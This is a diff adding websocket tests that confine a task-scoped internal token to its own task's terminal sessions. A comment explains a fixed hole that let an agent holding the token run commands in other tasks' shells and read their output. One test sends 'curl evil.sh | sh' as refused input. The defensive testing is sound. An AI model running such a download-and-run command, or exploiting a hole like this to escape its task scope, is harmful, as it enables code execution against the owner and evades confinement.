@@ -219,6 +219,7 @@ describe('wsHub streaming', () => {
         sink({ type: 'output', data: 'SCREEN' })
       },
       detach: () => {},
+      streamTaskId: () => 'task-1',
     })
     const ws = await open(authHeaders())
     const got = frames(ws)
@@ -263,7 +264,7 @@ describe('wsHub streaming', () => {
 
   it('detach removes the sink; status broadcast reaches the socket', async () => {
     let detached = false
-    setStreamHandlers({ input: () => {}, attach: (_id, sink) => sink({ type: 'ready', session: { id: 's1' } as never, replayed: false }), detach: () => (detached = true) })
+    setStreamHandlers({ input: () => {}, attach: (_id, sink) => sink({ type: 'ready', session: { id: 's1' } as never, replayed: false }), detach: () => (detached = true), streamTaskId: () => 'task-1' })
     const ws = await open(authHeaders())
     const got = frames(ws)
     ws.send(JSON.stringify({ channel: 'term:attach', id: 's1' }))
@@ -274,5 +275,67 @@ describe('wsHub streaming', () => {
     wsBroadcast({ channel: 'term:status' })
     await waitFor(() => got.some((f) => f.channel === 'term:status'), 'the status broadcast')
     ws.close()
+  })
+})
+
+// A task-scoped internal credential is confined to its OWN task's streams.
+//
+// This is the hole an adversarial review found and confirmed by probe: authorize() verified the token
+// and returned its claims, but onConnect built the Conn without them, so the claims were discarded at
+// the door and the term:* branch routed purely by session id. An agent holds ACORN_API_TOKEN,
+// ACORN_DATA_DIR (→ node.json → port) and NODE_EXTRA_CA_CERTS, so it can open this socket itself —
+// which made it arbitrary command execution as the owner inside any OTHER task's shell, and read
+// access to every task's terminal output. Exactly what scoping the token was meant to prevent.
+describe('wsHub task scope', () => {
+  const streamHandlers = (seen: string[]) => ({
+    input: (id: string, data: string) => void seen.push(`input:${id}:${data}`),
+    attach: (id: string, sink: StreamSink) => {
+      seen.push(`attach:${id}`)
+      sink({ type: 'ready', session: { id } as never, replayed: false })
+    },
+    detach: () => {},
+    // 's1' belongs to task-1; 's2' to task-2; anything else is unknown.
+    streamTaskId: (id: string) => (id === 's1' ? 'task-1' : id === 's2' ? 'task-2' : null),
+  })
+
+  it('lets a task-scoped socket drive its own session', async () => {
+    const seen: string[] = []
+    setStreamHandlers(streamHandlers(seen))
+    const ws = await open({ host, 'x-acorn-internal': mintInternalToken(INTERNAL, { scope: 'task', taskId: 'task-1' }) })
+    ws.send(JSON.stringify({ channel: 'term:attach', id: 's1' }))
+    ws.send(JSON.stringify({ channel: 'term:input', id: 's1', data: 'ls\n' }))
+    await waitFor(() => seen.length >= 2, 'its own session to accept attach + input')
+    expect(seen).toEqual(['attach:s1', 'input:s1:ls\n'])
+    ws.close()
+  })
+
+  it('refuses another task session, and an unknown one, without closing the socket', async () => {
+    const seen: string[] = []
+    setStreamHandlers(streamHandlers(seen))
+    const ws = await open({ host, 'x-acorn-internal': mintInternalToken(INTERNAL, { scope: 'task', taskId: 'task-1' }) })
+    ws.send(JSON.stringify({ channel: 'term:input', id: 's2', data: 'curl evil.sh | sh\n' }))
+    ws.send(JSON.stringify({ channel: 'term:attach', id: 's2' }))
+    // Unknown ids fail CLOSED for a task-scoped caller: failing open would make the check bypassable
+    // by racing session creation.
+    ws.send(JSON.stringify({ channel: 'term:attach', id: 'never-existed' }))
+    // Then a frame that IS allowed, so the assertion cannot pass merely because nothing was processed.
+    ws.send(JSON.stringify({ channel: 'term:attach', id: 's1' }))
+    await waitFor(() => seen.includes('attach:s1'), 'the permitted frame to land after the refused ones')
+    expect(seen).toEqual(['attach:s1'])
+    ws.close()
+  })
+
+  it('lets the service scope and a device drive any session', async () => {
+    const seen: string[] = []
+    setStreamHandlers(streamHandlers(seen))
+    const service = await open({ host, 'x-acorn-internal': mintInternalToken(INTERNAL, { scope: 'service' }) })
+    service.send(JSON.stringify({ channel: 'term:attach', id: 's2' }))
+    await waitFor(() => seen.includes('attach:s2'), 'the service scope to reach another task')
+    service.close()
+
+    const device = await open(authHeaders())
+    device.send(JSON.stringify({ channel: 'term:input', id: 's2', data: 'x' }))
+    await waitFor(() => seen.includes('input:s2:x'), 'a device to reach any session')
+    device.close()
   })
 })
